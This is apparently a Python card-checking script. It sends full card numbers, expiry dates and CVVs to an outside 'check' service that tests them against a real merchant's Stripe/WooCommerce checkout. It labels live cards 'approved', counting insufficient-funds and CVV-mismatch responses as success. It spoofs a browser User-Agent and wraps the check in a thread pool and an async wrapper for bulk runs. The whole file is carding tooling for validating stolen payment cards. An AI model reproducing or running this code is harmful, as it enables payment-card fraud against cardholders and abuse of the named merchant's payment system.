import httpx
import asyncio
from concurrent.futures import ThreadPoolExecutor

executor = ThreadPoolExecutor(max_workers=10)

# API Configuration
API_BASE_URL = "https://newrp.vercel.app/check"
DEFAULT_SITE = "https://grownetics.com"

# Success response indicators
SUCCESS_RESPONSES = [
    "authenticated",
    "authenticate_successful",
    "authenticate_verified",
    "authentication_required",
    "3ds_required",
    "3d_secure",
    "card_authenticated",
    "success",
    "approved",
    "insufficient",
    "cvv_failure",
    "incorrect_cvc",
    "avs_failure",
    "incorrect_zip",
]


def check_stripe_wc(card, mes, ano, cvv, site=None):
    """
    Check Stripe WooCommerce authentication using newrp.vercel.app API

    Args:
        card: Card number
        mes: Expiry month
        ano: Expiry year
        cvv: CVV
        site: WooCommerce site URL (default: grownetics.com)

    Returns:
        dict with status (approved/declined/error) and response message
    """
    try:
        # Use default site if none provided
        if not site:
            site = DEFAULT_SITE

        # Format card data
        fullcc = f"{card}|{mes}|{ano}|{cvv}"

        # Make request to API
        params = {
            "cc": fullcc,
            "site": site
        }

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
        }

        with httpx.Client(timeout=60, follow_redirects=True) as client:
            response = client.get(API_BASE_URL, params=params, headers=headers)

            # Try to parse JSON response
            try:
                data = response.json()

                # Check if response has status field
                if isinstance(data, dict):
                    message = data.get("message", "").lower()
                    status_field = data.get("status", "").lower()
                    result = data.get("result", "").lower()
                    response_text = data.get("response", "").lower()

                    # Combine all response fields for checking
                    combined_response = f"{message} {status_field} {result} {response_text}".lower()

                    # Check for success indicators
                    if any(keyword in combined_response for keyword in SUCCESS_RESPONSES):
                        # Return the actual message from API
                        response_msg = (
                            data.get("message") or
                            data.get("response") or
                            data.get("result") or
                            "AUTH_SUCCESS_✅"
                        )
                        return {
                            "status": "approved",
                            "response": response_msg
                        }

                    # Check for card errors (declined)
                    if any(word in combined_response for word in [
                        "declined", "invalid", "incorrect", "failed",
                        "expired", "lost", "stolen", "restricted"
                    ]):
                        response_msg = (
                            data.get("message") or
                            data.get("response") or
                            data.get("result") or
                            "CARD_DECLINED"
                        )
                        return {
                            "status": "declined",
                            "response": response_msg
                        }

                    # If we have a message, return it
                    if message or response_text or result:
                        response_msg = (
                            data.get("message") or
                            data.get("response") or
                            data.get("result") or
                            "UNKNOWN_RESPONSE"
                        )
                        return {
                            "status": "declined",
                            "response": response_msg
                        }

                # If we got here, return the raw response
                return {
                    "status": "error",
                    "response": f"UNEXPECTED_FORMAT: {str(data)[:100]}"
                }

            except ValueError:
                # Not JSON, check text response
                response_text = response.text.lower()

                # Check for success in text
                if any(keyword in response_text for keyword in SUCCESS_RESPONSES):
                    return {
                        "status": "approved",
                        "response": "AUTH_SUCCESS_✅"
                    }

                # Check for decline indicators
                if any(word in response_text for word in ["declined", "invalid", "failed"]):
                    return {
                        "status": "declined",
                        "response": "CARD_DECLINED"
                    }

                return {
                    "status": "error",
                    "response": f"NON_JSON_RESPONSE: {response.text[:100]}"
                }

    except httpx.TimeoutException:
        return {
            "status": "error",
            "response": "REQUEST_TIMEOUT"
        }

    except httpx.RequestError as e:
        return {
            "status": "error",
            "response": f"REQUEST_ERROR: {str(e)[:50]}"
        }

    except Exception as e:
        return {
            "status": "error",
            "response": f"EXCEPTION: {str(e)[:50]}"
        }


async def async_check_stripe_wc(card, mes, ano, cvv, site=None):
    """Async wrapper for Stripe WooCommerce check"""
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(
        executor,
        check_stripe_wc,
        card, mes, ano, cvv, site
    )
